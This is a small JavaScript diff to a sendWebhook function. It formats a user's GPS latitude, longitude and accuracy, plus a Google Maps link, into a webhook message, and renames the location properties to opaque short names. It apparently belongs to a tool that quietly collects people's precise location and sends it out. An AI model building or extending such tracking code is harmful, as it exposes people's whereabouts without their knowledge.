@@ -34,7 +34,7 @@ export const sendWebhook = async (
           },
           {
             name: "🌐 Location from GPS",
-            value: `Latitude: \`${gps.latitude}\`\nLongitude: \`${gps.longitude}\`\nAccuracy: \`${gps.accuracy}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${gps.latitude},${gps.longitude})`,
+            value: `Latitude: \`${gps.hh}\`\nLongitude: \`${gps.xf}\`\nAccuracy: \`${gps.ff}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${gps.hh},${gps.xf})`,
             inline: false
           }
         ];
